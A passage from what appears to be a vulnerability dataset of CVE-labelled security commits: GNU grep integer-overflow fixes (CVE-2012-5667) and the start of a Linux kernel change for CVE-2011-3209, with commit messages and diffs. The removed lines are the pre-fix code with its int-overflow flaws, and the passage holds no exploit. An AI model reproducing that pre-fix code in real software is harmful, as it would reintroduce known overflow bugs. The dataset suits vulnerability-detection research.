succeed.  *\/\n   int match_len;\t\/* Length of the character (or collating element)\n                            with which this operator match.  *\/\n@@ -3048,9 +3078,9 @@ match_mb_charset (struct dfa *d, int s, position pos, int idx)\n    in the buffer.\n    Caller MUST free the array which this function return.  *\/\n static int*\n-check_matching_with_multibyte_ops (struct dfa *d, int s, int idx)\n+check_matching_with_multibyte_ops (struct dfa *d, state_num s, size_t idx)\n {\n-  int i;\n+  size_t i;\n   int* rarray;\n \n   MALLOC(rarray, d->states[s].mbps.nelem);\n@@ -3079,11 +3109,13 @@ check_matching_with_multibyte_ops (struct dfa *d, int s, int idx)\n    `mbclen' and `pps' are the output.  `mbclen' is the length of the\n    character consumed, and `pps' is the set this function enumerate.  *\/\n static status_transit_state\n-transit_state_consume_1char (struct dfa *d, int s, unsigned char const **pp,\n+transit_state_consume_1char (struct dfa *d, state_num s,\n+                             unsigned char const **pp,\n                              int *match_lens, int *mbclen, position_set *pps)\n {\n-  int i, j;\n-  int s1, s2;\n+  size_t i, j;\n+  int k;\n+  state_num s1, s2;\n   int* work_mbls;\n   status_transit_state rs = TRANSIT_STATE_DONE;\n \n@@ -3095,7 +3127,7 @@ transit_state_consume_1char (struct dfa *d, int s, unsigned char const **pp,\n   \/* Calculate the state which can be reached from the state `s' by\n      consuming `*mbclen' single bytes from the buffer.  *\/\n   s1 = s;\n-  for (i = 0; i < *mbclen; i++)\n+  for (k = 0; k < *mbclen; k++)\n     {\n       s2 = s1;\n       rs = transit_state_singlebyte(d, s2, (*pp)++, &s1);\n@@ -3128,15 +3160,15 @@ transit_state_consume_1char (struct dfa *d, int s, unsigned char const **pp,\n \/* Transit state from s, then return new state and update the pointer of the\n    buffer.  This function is for some operator which can match with a multi-\n    byte character or a collating element (which may be multi characters).  *\/\n-static int\n-transit_state (struct dfa *d, int s, unsigned char const **pp)\n+static state_num\n+transit_state (struct dfa *d, state_num s, unsigned char const **pp)\n {\n-  int s1;\n+  state_num s1;\n   int mbclen;\t\t\/* The length of current input multibyte character. *\/\n   int maxlen = 0;\n-  int i, j;\n+  size_t i, j;\n   int *match_lens = NULL;\n-  int nelem = d->states[s].mbps.nelem; \/* Just a alias.  *\/\n+  size_t nelem = d->states[s].mbps.nelem; \/* Just a alias.  *\/\n   position_set follows;\n   unsigned char const *p1 = *pp;\n   wchar_t wc;\n@@ -3271,11 +3303,11 @@ prepare_wc_buf (const char *begin, const char *end)\n    to decide whether to fall back on a backtracking matcher. *\/\n char *\n dfaexec (struct dfa *d, char const *begin, char *end,\n-         int allow_nl, int *count, int *backref)\n+         int allow_nl, size_t *count, int *backref)\n {\n-  int s, s1;\t\t\/* Current state. *\/\n+  state_num s, s1;\t\t\/* Current state. *\/\n   unsigned char const *p; \/* Current input character. *\/\n-  int **trans, *t;\t\/* Copy of d->trans so it can be optimized\n+  state_num **trans, *t;\t\/* Copy of d->trans so it can be optimized\n                                    into a register. *\/\n   unsigned char eol = eolbyte;\t\/* Likewise for eolbyte.  *\/\n   unsigned char saved_end;\n@@ -3338,7 +3370,7 @@ dfaexec (struct dfa *d, char const *begin, char *end,\n               s1 = t[*p++];\n               if ((t = trans[s1]) == NULL)\n                 {\n-                  int tmp = s; s = s1; s1 = tmp; \/* swap *\/\n+                  state_num tmp = s; s = s1; s1 = tmp; \/* swap *\/\n                   break;\n                 }\n               s = t[*p++];\n@@ -3415,14 +3447,14 @@ dfaexec (struct dfa *d, char const *begin, char *end,\n static void\n free_mbdata (struct dfa *d)\n {\n-  unsigned int i;\n+  size_t i;\n \n   free(d->multibyte_prop);\n   d->multibyte_prop = NULL;\n \n   for (i = 0; i < d->nmbcsets; ++i)\n     {\n-      unsigned int j;\n+      size_t j;\n       struct mb_char_classes *p = &(d->mbcsets[i]);\n       free(p->chars);\n       free(p->ch_classes);\n@@ -3470,7 +3502,7 @@ dfainit (struct dfa *d)\n static void\n dfaoptimize (struct dfa *d)\n {\n-  unsigned int i;\n+  size_t i;\n \n   if (!MBS_SUPPORT || !using_utf8())\n     return;\n@@ -3509,7 +3541,7 @@ dfacomp (char const *s, size_t len, struct dfa *d, int searchflag)\n void\n dfafree (struct dfa *d)\n {\n-  int i;\n+  size_t i;\n   struct dfamust *dm, *ndm;\n \n   free(d->charclasses);\n@@ -3663,7 +3695,7 @@ istrstr (char const *lookin, char const *lookfor)\n static void\n freelist (char **cpp)\n {\n-  int i;\n+  size_t i;\n \n   if (cpp == NULL)\n     return;\n@@ -3677,7 +3709,7 @@ freelist (char **cpp)\n static char **\n enlist (char **cpp, char *new, size_t len)\n {\n-  int i, j;\n+  size_t i, j;\n \n   if (cpp == NULL)\n     return NULL;\n@@ -3762,7 +3794,7 @@ comsubs (char *left, char const *right)\n static char **\n addlists (char **old, char **new)\n {\n-  int i;\n+  size_t i;\n \n   if (old == NULL || new == NULL)\n     return NULL;\n@@ -3782,7 +3814,7 @@ inboth (char **left, char **right)\n {\n   char **both;\n   char **temp;\n-  int lnum, rnum;\n+  size_t lnum, rnum;\n \n   if (left == NULL || right == NULL)\n     return NULL;\n@@ -3831,8 +3863,8 @@ dfamust (struct dfa *d)\n   must *musts;\n   must *mp;\n   char *result;\n-  int ri;\n-  int i;\n+  size_t ri;\n+  size_t i;\n   int exact;\n   token t;\n   static must must0;\n@@ -3858,7 +3890,7 @@ dfamust (struct dfa *d)\n   fprintf(stderr, \"dfamust:\\n\");\n   for (i = 0; i < d->tindex; ++i)\n     {\n-      fprintf(stderr, \" %d:\", i);\n+      fprintf(stderr, \" %zd:\", i);\n       prtok(d->tokens[i]);\n     }\n   putc('\\n', stderr);\n@@ -3892,7 +3924,7 @@ dfamust (struct dfa *d)\n             char **new;\n             must *lmp;\n             must *rmp;\n-            int j, ln, rn, n;\n+            size_t j, ln, rn, n;\n \n             rmp = --mp;\n             lmp = --mp;\n@@ -4020,7 +4052,7 @@ dfamust (struct dfa *d)\n           break;\n         }\n #ifdef DEBUG\n-      fprintf(stderr, \" node: %d:\", ri);\n+      fprintf(stderr, \" node: %zd:\", ri);\n       prtok(d->tokens[ri]);\n       fprintf(stderr, \"\\n  in:\");\n       for (i = 0; mp->in[i]; ++i)\ndiff --git a\/src\/dfa.h b\/src\/dfa.h\nindex 351a470..96dd4b8 100644\n--- a\/src\/dfa.h\n+++ b\/src\/dfa.h\n@@ -63,7 +63,7 @@ extern void dfacomp (char const *, size_t, struct dfa *, int);\n    encountered a back-reference (1) or not (0).  The caller may use this\n    to decide whether to fall back on a backtracking matcher. *\/\n extern char *dfaexec (struct dfa *d, char const *begin, char *end,\n-                      int newline, int *count, int *backref);\n+                      int newline, size_t *count, int *backref);\n \n \/* Free the storage held by the components of a struct dfa. *\/\n extern void dfafree (struct dfa *);\n@@ -82,7 +82,7 @@ extern void dfaanalyze (struct dfa *, int);\n \n \/* Compute, for each possible character, the transitions out of a given\n    state, storing them in an array of integers. *\/\n-extern void dfastate (int, struct dfa *, int []);\n+extern void dfastate (ptrdiff_t, struct dfa *, ptrdiff_t []);\n \n \/* Error handling. *\/\n \ndiff --git a\/src\/dfasearch.c b\/src\/dfasearch.c\nindex 512f58c..ffb8bb1 100644\n--- a\/src\/dfasearch.c\n+++ b\/src\/dfasearch.c\n@@ -19,6 +19,7 @@\n \/* Written August 1992 by Mike Haertel. *\/\n \n #include <config.h>\n+#include \"intprops.h\"\n #include \"search.h\"\n #include \"dfa.h\"\n \n@@ -71,7 +72,7 @@ dfawarn (char const *mesg)\n \/* Number of compiled fixed strings known to exactly match the regexp.\n    If kwsexec returns < kwset_exact_matches, then we don't need to\n    call the regexp matcher at all. *\/\n-static int kwset_exact_matches;\n+static size_t kwset_exact_matches;\n \n static char const *\n kwsincr_case (const char *must)\n@@ -211,7 +212,9 @@ EGexecute (char const *buf, size_t size, size_t *match_size,\n {\n   char const *buflim, *beg, *end, *match, *best_match, *mb_start;\n   char eol = eolbyte;\n-  int backref, start, len, best_len;\n+  int backref;\n+  regoff_t start;\n+  ptrdiff_t len, best_len;\n   struct kwsmatch kwsm;\n   size_t i, ret_val;\n   if (MB_CUR_MAX > 1)\n@@ -294,6 +297,11 @@ EGexecute (char const *buf, size_t size, size_t *match_size,\n           end = buflim;\n         }\n \n+      \/* If the \"line\" is longer than the maximum regexp offset,\n+         die as if we've run out of memory.  *\/\n+      if (TYPE_MAXIMUM (regoff_t) < end - buf - 1)\n+        xalloc_die ();\n+\n       \/* If we've made it to this point, this means DFA has seen\n          a probable match, and we need to run it through Regex. *\/\n       best_match = end;\n@@ -301,10 +309,13 @@ EGexecute (char const *buf, size_t size, size_t *match_size,\n       for (i = 0; i < pcount; i++)\n         {\n           patterns[i].regexbuf.not_eol = 0;\n-          if (0 <= (start = re_search (&(patterns[i].regexbuf),\n-                                       buf, end - buf - 1,\n-                                       beg - buf, end - beg - 1,\n-                                       &(patterns[i].regs))))\n+          start = re_search (&(patterns[i].regexbuf),\n+                             buf, end - buf - 1,\n+                             beg - buf, end - beg - 1,\n+                             &(patterns[i].regs));\n+          if (start < -1)\n+            xalloc_die ();\n+          else if (0 <= start)\n             {\n               len = patterns[i].regs.end[0] - start;\n               match = buf + start;\n@@ -341,6 +352,8 @@ EGexecute (char const *buf, size_t size, size_t *match_size,\n                         len = re_match (&(patterns[i].regexbuf),\n                                         buf, match + len - beg, match - buf,\n                                         &(patterns[i].regs));\n+                        if (len < -1)\n+                          xalloc_die ();\n                       }\n                     if (len <= 0)\n                       {\n@@ -354,7 +367,11 @@ EGexecute (char const *buf, size_t size, size_t *match_size,\n                                            match - buf, end - match - 1,\n                                            &(patterns[i].regs));\n                         if (start < 0)\n-                          break;\n+                          {\n+                            if (start < -1)\n+                              xalloc_die ();\n+                            break;\n+                          }\n                         len = patterns[i].regs.end[0] - start;\n                         match = buf + start;\n                       }\ndiff --git a\/src\/kwset.c b\/src\/kwset.c\nindex 7c37ab0..5496371 100644\n--- a\/src\/kwset.c\n+++ b\/src\/kwset.c\n@@ -62,7 +62,7 @@ struct tree\n \/* Node of a trie representing a set of reversed keywords. *\/\n struct trie\n {\n-  unsigned int accepting;\t\/* Word index of accepted word, or zero. *\/\n+  size_t accepting;\t\t\/* Word index of accepted word, or zero. *\/\n   struct tree *links;\t\t\/* Tree of edges leaving this node. *\/\n   struct trie *parent;\t\t\/* Parent of this node. *\/\n   struct trie *next;\t\t\/* List of all trie nodes in level order. *\/\n@@ -76,7 +76,7 @@ struct trie\n struct kwset\n {\n   struct obstack obstack;\t\/* Obstack for node allocation. *\/\n-  int words;\t\t\t\/* Number of words in the trie. *\/\n+  ptrdiff_t words;\t\t\/* Number of words in the trie. *\/\n   struct trie *trie;\t\t\/* The trie itself. *\/\n   int mind;\t\t\t\/* Minimum depth of an accepting node. *\/\n   int maxd;\t\t\t\/* Maximum depth of any node. *\/\ndiff --git a\/src\/kwset.h b\/src\/kwset.h\nindex 5fa44ae..01775e1 100644\n--- a\/src\/kwset.h\n+++ b\/src\/kwset.h\n@@ -23,7 +23,7 @@\n \n struct kwsmatch\n {\n-  int index;\t\t\t\/* Index number of matching keyword. *\/\n+  size_t index;\t\t\t\/* Index number of matching keyword. *\/\n   size_t offset[1];\t\t\/* Offset of each submatch. *\/\n   size_t size[1];\t\t\/* Length of each submatch. *\/\n };\ndiff --git a\/tests\/big-match b\/tests\/big-match\nold mode 100644\nnew mode 100755\n-- \ncgit v1.0-41-gc330\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2012-5667","CWE_ID":"189","category":"security","commit_id":"8fcf61523644df42e1905c81bed26838e0b04f91","commit_message":"From 8fcf61523644df42e1905c81bed26838e0b04f91 Mon Sep 17 00:00:00 2001\nFrom: Paul Eggert <eggert@cs.ucla.edu>\nDate: Wed, 29 Feb 2012 00:49:40 -0800\nSubject: grep: fix integer-overflow issues in main program\n\n* NEWS: Document this.\n* bootstrap.conf (gnulib_modules): Add inttypes, xstrtoimax.\nRemove xstrtoumax.\n* src\/main.c: Include <inttypes.h>, for INTMAX_MAX, PRIdMAX.\n(context_length_arg, prtext, grepbuf, grep, grepfile)\n(get_nondigit_option, main):\nUse intmax_t, not int, for line counts.\n(context_length_arg, main): Silently ceiling line counts\nto maximum value, since there's no practical difference between\ndoing that and using infinite-precision arithmetic.\n(out_before, out_after, pending): Now intmax_t, not int.\n(max_count, outleft): Now intmax_t, not off_t.\n(prepend_args, prepend_default_options, main):\nUse size_t, not int, for sizes.\n(prepend_default_options): Check for int and size_t overflow.\n---\n NEWS           |  5 ++++\n bootstrap.conf |  3 +-\n src\/main.c     | 95 +++++++++++++++++++++++++++++-----------------------------\n 3 files changed, 55 insertions(+), 48 deletions(-)\n\n","diff_code":"diff --git a\/NEWS b\/NEWS\nindex 47e0ca4..5ff4027 100644\n--- a\/NEWS\n+++ b\/NEWS\n@@ -11,6 +11,11 @@ GNU grep NEWS                                    -*- outline -*-\n   GNU C library's regular expression functions cannot handle such long lines.\n   [bug present since \"the beginning\"]\n \n+  The -m, -A, -B, and -C options no longer mishandle context line\n+  counts that do not fit in 'int'.  Also, grep -c's counts are now\n+  limited by the type 'intmax_t' (typically less than 2**63) rather\n+  than 'int' (typically less than 2**31).\n+\n   grep no longer silently suppresses errors when reading a directory\n   as if it were a text file.  For example, \"grep x .\" now reports a\n   read error on most systems; formerly, it ignored the error.\ndiff --git a\/bootstrap.conf b\/bootstrap.conf\nindex 2b7a5ec..45bb33d 100644\n--- a\/bootstrap.conf\n+++ b\/bootstrap.conf\n@@ -41,6 +41,7 @@ gnupload\n hard-locale\n ignore-value\n intprops\n+inttypes\n isatty\n isblank\n isdir\n@@ -85,7 +86,7 @@ wcscoll\n wctob\n wctype-h\n xalloc\n-xstrtoumax\n+xstrtoimax\n '\n gnulib_name=libgreputils\n \ndiff --git a\/src\/main.c b\/src\/main.c\nindex 3c5f6dd..7d83f4d 100644\n--- a\/src\/main.c\n+++ b\/src\/main.c\n@@ -25,6 +25,7 @@\n #include <wchar.h>\n #include <wctype.h>\n #include <fcntl.h>\n+#include <inttypes.h>\n #include <stdio.h>\n #include \"system.h\"\n \n@@ -425,17 +426,21 @@ clean_up_stdout (void)\n     close_stdout ();\n }\n \n-\/* Convert STR to a positive integer, storing the result in *OUT.\n+\/* Convert STR to a nonnegative integer, storing the result in *OUT.\n    STR must be a valid context length argument; report an error if it\n-   isn't.  *\/\n+   isn't.  Silently ceiling *OUT at the maximum value, as that is\n+   practically equivalent to infinity for grep's purposes.  *\/\n static void\n-context_length_arg (char const *str, int *out)\n+context_length_arg (char const *str, intmax_t *out)\n {\n-  uintmax_t value;\n-  if (! (xstrtoumax (str, 0, 10, &value, \"\") == LONGINT_OK\n-         && 0 <= (*out = value)\n-         && *out == value))\n+  switch (xstrtoimax (str, 0, 10, out, \"\"))\n     {\n+    case LONGINT_OK:\n+    case LONGINT_OVERFLOW:\n+      if (0 <= *out)\n+        break;\n+      \/* Fall through.  *\/\n+    default:\n       error (EXIT_TROUBLE, 0, \"%s: %s\", str,\n              _(\"invalid context length argument\"));\n     }\n@@ -603,12 +608,12 @@ static int out_invert;\t\t\/* Print nonmatching stuff. *\/\n static int out_file;\t\t\/* Print filenames. *\/\n static int out_line;\t\t\/* Print line numbers. *\/\n static int out_byte;\t\t\/* Print byte offsets. *\/\n-static int out_before;\t\t\/* Lines of leading context. *\/\n-static int out_after;\t\t\/* Lines of trailing context. *\/\n+static intmax_t out_before;\t\/* Lines of leading context. *\/\n+static intmax_t out_after;\t\/* Lines of trailing context. *\/\n static int count_matches;\t\/* Count matching lines.  *\/\n static int list_files;\t\t\/* List matching files.  *\/\n static int no_filenames;\t\/* Suppress file names.  *\/\n-static off_t max_count;\t\t\/* Stop after outputting this many\n+static intmax_t max_count;\t\/* Stop after outputting this many\n                                    lines from an input file.  *\/\n static int line_buffered;       \/* If nonzero, use line buffering, i.e.\n                                    fflush everyline out.  *\/\n@@ -622,8 +627,8 @@ static char const *lastout;\t\/* Pointer after last character output;\n                                    NULL if no character has been output\n                                    or if it's conceptually before bufbeg. *\/\n static uintmax_t totalnl;\t\/* Total newline count before lastnl. *\/\n-static off_t outleft;\t\t\/* Maximum number of lines to be output.  *\/\n-static int pending;\t\t\/* Pending lines of output.\n+static intmax_t outleft;\t\/* Maximum number of lines to be output.  *\/\n+static intmax_t pending;\t\/* Pending lines of output.\n                                    Always kept 0 if out_quiet is true.  *\/\n static int done_on_match;\t\/* Stop scanning file on first match.  *\/\n static int exit_on_match;\t\/* Exit on first match.  *\/\n@@ -917,12 +922,12 @@ prpending (char const *lim)\n \/* Print the lines between BEG and LIM.  Deal with context crap.\n    If NLINESP is non-null, store a count of lines between BEG and LIM.  *\/\n static void\n-prtext (char const *beg, char const *lim, int *nlinesp)\n+prtext (char const *beg, char const *lim, intmax_t *nlinesp)\n {\n   static int used;\t\/* avoid printing SEP_STR_GROUP before any output *\/\n   char const *bp, *p;\n   char eol = eolbyte;\n-  int i, n;\n+  intmax_t i, n;\n \n   if (!out_quiet && pending > 0)\n     prpending (beg);\n@@ -1026,10 +1031,10 @@ do_execute (char const *buf, size_t size, size_t *match_size, char const *start_\n \/* Scan the specified portion of the buffer, matching lines (or\n    between matching lines if OUT_INVERT is true).  Return a count of\n    lines printed. *\/\n-static int\n+static intmax_t\n grepbuf (char const *beg, char const *lim)\n {\n-  int nlines, n;\n+  intmax_t nlines, n;\n   char const *p;\n   size_t match_offset;\n   size_t match_size;\n@@ -1046,7 +1051,7 @@ grepbuf (char const *beg, char const *lim)\n         break;\n       if (!out_invert)\n         {\n-          prtext (b, endp, (int *) 0);\n+          prtext (b, endp, NULL);\n           nlines++;\n           outleft--;\n           if (!outleft || done_on_match)\n@@ -1079,10 +1084,10 @@ grepbuf (char const *beg, char const *lim)\n \/* Search a given file.  Normally, return a count of lines printed;\n    but if the file is a directory and we search it recursively, then\n    return -2 if there was a match, and -1 otherwise.  *\/\n-static int\n+static intmax_t\n grep (int fd, char const *file, struct stats *stats)\n {\n-  int nlines, i;\n+  intmax_t nlines, i;\n   int not_text;\n   size_t residue, save;\n   char oldc;\n@@ -1212,7 +1217,7 @@ static int\n grepfile (char const *file, struct stats *stats)\n {\n   int desc;\n-  int count;\n+  intmax_t count;\n   int status;\n \n   filename = (file ? file : label ? label : _(\"(standard input)\"));\n@@ -1319,7 +1324,7 @@ grepfile (char const *file, struct stats *stats)\n               else\n                 fputc (0, stdout);\n             }\n-          printf (\"%d\\n\", count);\n+          printf (\"%\" PRIdMAX \"\\n\", count);\n         }\n \n       status = !count;\n@@ -1590,12 +1595,12 @@ setmatcher (char const *m)\n    etc. to the option copies.  Return the number N of options found.\n    Do not set ARGV[N] to NULL.  If ARGV is NULL, do not store ARGV[0]\n    etc.  Backslash can be used to escape whitespace (and backslashes).  *\/\n-static int\n+static size_t\n prepend_args (char const *options, char *buf, char **argv)\n {\n   char const *o = options;\n   char *b = buf;\n-  int n = 0;\n+  size_t n = 0;\n \n   for (;;)\n     {\n@@ -1625,10 +1630,14 @@ prepend_default_options (char const *options, int *pargc, char ***pargv)\n   if (options && *options)\n     {\n       char *buf = xmalloc (strlen (options) + 1);\n-      int prepended = prepend_args (options, buf, (char **) NULL);\n+      size_t prepended = prepend_args (options, buf, NULL);\n       int argc = *pargc;\n       char *const *argv = *pargv;\n-      char **pp = xmalloc ((prepended + argc + 1) * sizeof *pp);\n+      char **pp;\n+      enum { MAX_ARGS = MIN (INT_MAX, SIZE_MAX \/ sizeof *pp - 1) };\n+      if (MAX_ARGS - argc < prepended)\n+        xalloc_die ();\n+      pp = xmalloc ((prepended + argc + 1) * sizeof *pp);\n       *pargc = prepended + argc;\n       *pargv = pp;\n       *pp++ = *argv++;\n@@ -1646,11 +1655,11 @@ prepend_default_options (char const *options, int *pargc, char ***pargv)\n    Process any digit options that were encountered on the way,\n    and store the resulting integer into *DEFAULT_CONTEXT.  *\/\n static int\n-get_nondigit_option (int argc, char *const *argv, int *default_context)\n+get_nondigit_option (int argc, char *const *argv, intmax_t *default_context)\n {\n   static int prev_digit_optind = -1;\n   int opt, this_digit_optind, was_digit;\n-  char buf[sizeof (uintmax_t) * CHAR_BIT + 4];\n+  char buf[INT_BUFSIZE_BOUND (intmax_t) + 4];\n   char *p = buf;\n \n   was_digit = 0;\n@@ -1760,11 +1769,11 @@ main (int argc, char **argv)\n   char *keys;\n   size_t keycc, oldcc, keyalloc;\n   int with_filenames;\n-  int opt, cc, status, prepended;\n+  size_t cc;\n+  int opt, status, prepended;\n   int prev_optind, last_recursive;\n-  int default_context;\n+  intmax_t default_context;\n   FILE *fp;\n-\n   exit_failure = EXIT_TROUBLE;\n   initialize_main (&argc, &argv);\n   set_program_name (argv[0]);\n@@ -1776,7 +1785,7 @@ main (int argc, char **argv)\n   eolbyte = '\\n';\n   filename_mask = ~0;\n \n-  max_count = TYPE_MAXIMUM (off_t);\n+  max_count = INTMAX_MAX;\n \n   \/* The value -1 means to use DEFAULT_CONTEXT. *\/\n   out_after = out_before = -1;\n@@ -1947,23 +1956,15 @@ main (int argc, char **argv)\n         break;\n \n       case 'm':\n-        {\n-          uintmax_t value;\n-          switch (xstrtoumax (optarg, 0, 10, &value, \"\"))\n-            {\n-            case LONGINT_OK:\n-              max_count = value;\n-              if (0 <= max_count && max_count == value)\n-                break;\n-              \/* Fall through.  *\/\n-            case LONGINT_OVERFLOW:\n-              max_count = TYPE_MAXIMUM (off_t);\n-              break;\n+        switch (xstrtoimax (optarg, 0, 10, &max_count, \"\"))\n+          {\n+          case LONGINT_OK:\n+          case LONGINT_OVERFLOW:\n+            break;\n \n-            default:\n-              error (EXIT_TROUBLE, 0, _(\"invalid max count\"));\n-            }\n-        }\n+          default:\n+            error (EXIT_TROUBLE, 0, _(\"invalid max count\"));\n+          }\n         break;\n \n       case 'n':\n-- \ncgit v1.0-41-gc330\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2011-3209","CWE_ID":"189","category":"security","commit_id":"f8bd2258e2d520dff28c855658bd24bdafb5102d","commit_message":"From f8bd2258e2d520dff28c855658bd24bdafb5102d Mon Sep 17 00:00:00 2001\nFrom: Roman Zippel <zippel@linux-m68k.org>\nDate: Thu, 1 May 2008 04:34:31 -0700\nSubject: remove div_long_long_rem\n\nx86 is the only arch right now, which provides an optimized for\ndiv_long_long_rem and it has the downside that one has to be very careful that\nthe divide doesn't overflow.\n\nThe API is a little akward, as the arguments for the unsigned divide are\nsigned.  The signed version also doesn't handle a negative divisor and\nproduces worse code on 64bit archs.\n\nThere is little incentive to keep this API alive, so this converts the few\nusers to the new API.\n\nSigned-off-by: Roman Zippel <zippel@linux-m68k.org>\nCc: Ralf Baechle <ralf@linux-mips.org>\nCc: Ingo Molnar <mingo@elte.hu>\nCc: Thomas Gleixner <tglx@linutronix.de>\nCc: john stultz <johnstul@us.ibm.com>\nCc: Christoph Lameter <clameter@sgi.com>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n arch\/mips\/kernel\/binfmt_elfn32.c |  5 ++--\n arch\/mips\/kernel\/binfmt_elfo32.c |  5 ++--\n drivers\/char\/mmtimer.c           | 24 +++++++++-----------\n include\/asm-x86\/div64.h          | 18 ---------------\n include\/linux\/calc64.h           | 49 ----------------------------------------\n include\/linux\/jiffies.h          |  2 +-\n kernel\/posix-cpu-timers.c        | 11 ++++-----\n kernel\/time.c                    | 25 ++++++++++++--------\n kernel\/time\/ntp.c                |  6 ++---\n mm\/slub.c                        |  9 ++++----\n 10 files changed, 44 insertions(+), 110 deletions(-)\n delete mode 100644 include\/linux\/calc64.h\n\n","diff_code":"diff --git a\/arch\/mips\/kernel\/binfmt_elfn32.c b\/arch\/mips\/kernel\/binfmt_elfn32.c\nindex 77db3473deab..9fdd8bcdd21e 100644\n--- a\/arch\/mips\/kernel\/binfmt_elfn32.c\n+++ b\/arch\/mips\/kernel\/binfmt_elfn32.c\n@@ -54,6 +54,7 @@ typedef elf_fpreg_t elf_fpregset_t[ELF_NFPREG];\n #include <linux\/module.h>\n #include <linux\/elfcore.h>\n #include <linux\/compat.h>\n+#include <linux\/math64.h>\n \n #define elf_prstatus elf_prstatus32\n struct elf_prstatus32\n@@ -102,8 +103,8 @@ jiffies_to_compat_timeval(unsigned long jiffies, struct compat_timeval *value)\n \t * one divide.\n \t *\/\n \tu64 nsec = (u64)jiffies * TICK_NSEC;\n-\tlong rem;\n-\tvalue->tv_sec = div_long_long_rem(nsec, NSEC_PER_SEC, &rem);\n+\tu32 rem;\n+\tvalue->tv_sec = div_u64_rem(nsec, NSEC_PER_SEC, &rem);\n \tvalue->tv_usec = rem \/ NSEC_PER_USEC;\n }\n \ndiff --git a\/arch\/mips\/kernel\/binfmt_elfo32.c b\/arch\/mips\/kernel\/binfmt_elfo32.c\nindex 08f4cd781ee3..e1333d7319e2 100644\n--- a\/arch\/mips\/kernel\/binfmt_elfo32.c\n+++ b\/arch\/mips\/kernel\/binfmt_elfo32.c\n@@ -56,6 +56,7 @@ typedef elf_fpreg_t elf_fpregset_t[ELF_NFPREG];\n #include <linux\/module.h>\n #include <linux\/elfcore.h>\n #include <linux\/compat.h>\n+#include <linux\/math64.h>\n \n #define elf_prstatus elf_prstatus32\n struct elf_prstatus32\n@@ -104,8 +105,8 @@ jiffies_to_compat_timeval(unsigned long jiffies, struct compat_timeval *value)\n \t * one divide.\n \t *\/\n \tu64 nsec = (u64)jiffies * TICK_NSEC;\n-\tlong rem;\n-\tvalue->tv_sec = div_long_long_rem(nsec, NSEC_PER_SEC, &rem);\n+\tu32 rem;\n+\tvalue->tv_sec = div_u64_rem(nsec, NSEC_PER_SEC, &rem);\n \tvalue->tv_usec = rem \/ NSEC_PER_USEC;\n }\n \ndiff --git a\/drivers\/char\/mmtimer.c b\/drivers\/char\/mmtimer.c\nindex d83db5d880e0..192961fd7173 100644\n--- a\/drivers\/char\/mmtimer.c\n+++ b\/drivers\/char\/mmtimer.c\n@@ -30,6 +30,8 @@\n #include <linux\/miscdevice.h>\n #include <linux\/posix-timers.h>\n #include <linux\/interrupt.h>\n+#include <linux\/time.h>\n+#include <linux\/math64.h>\n \n #include <asm\/uaccess.h>\n #include <asm\/sn\/addrs.h>\n@@ -472,8 +474,8 @@ static int sgi_clock_get(clockid_t clockid, struct timespec *tp)\n \n \tnsec = rtc_time() * sgi_clock_period\n \t\t\t+ sgi_clock_offset.tv_nsec;\n-\ttp->tv_sec = div_long_long_rem(nsec, NSEC_PER_SEC, &tp->tv_nsec)\n-\t\t\t+ sgi_clock_offset.tv_sec;\n+\t*tp = ns_to_timespec(nsec);\n+\ttp->tv_sec += sgi_clock_offset.tv_sec;\n \treturn 0;\n };\n \n@@ -481,11 +483,11 @@ static int sgi_clock_set(clockid_t clockid, struct timespec *tp)\n {\n \n \tu64 nsec;\n-\tu64 rem;\n+\tu32 rem;\n \n \tnsec = rtc_time() * sgi_clock_period;\n \n-\tsgi_clock_offset.tv_sec = tp->tv_sec - div_long_long_rem(nsec, NSEC_PER_SEC, &rem);\n+\tsgi_clock_offset.tv_sec = tp->tv_sec - div_u64_rem(nsec, NSEC_PER_SEC, &rem);\n \n \tif (rem <= tp->tv_nsec)\n \t\tsgi_clock_offset.tv_nsec = tp->tv_sec - rem;\n@@ -644,9 +646,6 @@ static int sgi_timer_del(struct k_itimer *timr)\n \treturn 0;\n }\n \n-#define timespec_to_ns(x) ((x).tv_nsec + (x).tv_sec * NSEC_PER_SEC)\n-#define ns_to_timespec(ts, nsec) (ts).tv_sec = div_long_long_rem(nsec, NSEC_PER_SEC, &(ts).tv_nsec)\n-\n \/* Assumption: it_lock is already held with irq's disabled *\/\n static void sgi_timer_get(struct k_itimer *timr, struct itimerspec *cur_setting)\n {\n@@ -659,9 +658,8 @@ static void sgi_timer_get(struct k_itimer *timr, struct itimerspec *cur_setting)\n \t\treturn;\n \t}\n \n-\tns_to_timespec(cur_setting->it_interval, timr->it.mmtimer.incr * sgi_clock_period);\n-\tns_to_timespec(cur_setting->it_value, (timr->it.mmtimer.expires - rtc_time())* sgi_clock_period);\n-\treturn;\n+\tcur_setting->it_interval = ns_to_timespec(timr->it.mmtimer.incr * sgi_clock_period);\n+\tcur_setting->it_value = ns_to_timespec((timr->it.mmtimer.expires - rtc_time()) * sgi_clock_period);\n }\n \n \n@@ -679,8 +677,8 @@ static int sgi_timer_set(struct k_itimer *timr, int flags,\n \t\tsgi_timer_get(timr, old_setting);\n \n \tsgi_timer_del(timr);\n-\twhen = timespec_to_ns(new_setting->it_value);\n-\tperiod = timespec_to_ns(new_setting->it_interval);\n+\twhen = timespec_to_ns(&new_setting->it_value);\n+\tperiod = timespec_to_ns(&new_setting->it_interval);\n \n \tif (when == 0)\n \t\t\/* Clear timer *\/\n@@ -695,7 +693,7 @@ static int sgi_timer_set(struct k_itimer *timr, int flags,\n \t\tunsigned long now;\n \n \t\tgetnstimeofday(&n);\n-\t\tnow = timespec_to_ns(n);\n+\t\tnow = timespec_to_ns(&n);\n \t\tif (when > now)\n \t\t\twhen -= now;\n \t\telse\ndiff --git a\/include\/asm-x86\/div64.h b\/include\/asm-x86\/div64.h\nindex 32fdbddaae55..9a2d644c08ef 100644\n--- a\/include\/asm-x86\/div64.h\n+++ b\/include\/asm-x86\/div64.h\n@@ -33,24 +33,6 @@\n \t__mod;\t\t\t\t\t\t\t\\\n })\n \n-\/*\n- * (long)X = ((long long)divs) \/ (long)div\n- * (long)rem = ((long long)divs) % (long)div\n- *\n- * Warning, this will do an exception if X overflows.\n- *\/\n-#define div_long_long_rem(a, b, c) div_ll_X_l_rem(a, b, c)\n-\n-static inline long div_ll_X_l_rem(long long divs, long div, long *rem)\n-{\n-\tlong dum2;\n-\tasm(\"divl 